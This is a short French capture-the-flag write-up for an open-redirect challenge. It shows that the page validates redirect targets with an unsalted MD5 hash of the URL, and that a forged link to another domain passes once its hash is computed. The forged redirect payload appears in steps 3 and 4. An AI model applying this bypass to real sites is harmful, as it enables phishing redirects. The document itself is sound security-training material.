# HTTP - Open redirect

## Enoncé

```
Trouvez un moyen de faire une redirection vers un domaine autre que ceux proposés sur la page web.
```

## Procédure

1. Analyse de la page

Il y a 3 liens cliquables, un vers Facebook, un autre vers Twitter et le dernier vers Slack.

Voici le code source de la page html représentant les 3 liens: 

```
<a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook</a>
<a href='?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0'>twitter</a>
<a href='?url=https://slack.com&h=e52dc719664ead63be3d5066c135b6da'>slack</a>
```

2. Analyse du hash

Exemple pour facebook : 

```
cypher = a023cfbf5f1c39bdf8407f28b60cd134 <-- Type de hash MD5
cypher = https://facebook.com
```

3. Création de la payload

Pour ce faire il me faut un site web comme Facebook, je vais prendre Instagram.

```
https://www.instagram.com
```

J'encode ensuite le lien en MD5.

```
81baa2bda524b19dddf2507580b95e0b
```

Résultat : 

```
https://www.instagram.com&h=81baa2bda524b19dddf2507580b95e0b
```

4. Exploitation 

Je remplace de la page html un lien cliquable par le mien et je clique ensuite dessus.

Changement sur la page : 

```
<a href='?url=https://www.instagram.com&h=81baa2bda524b19dddf2507580b95e0b'>facebook</a>
<a href='?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0'>twitter</a>
<a href='?url=https://slack.com&h=e52dc719664ead63be3d5066c135b6da'>slack</a>
```
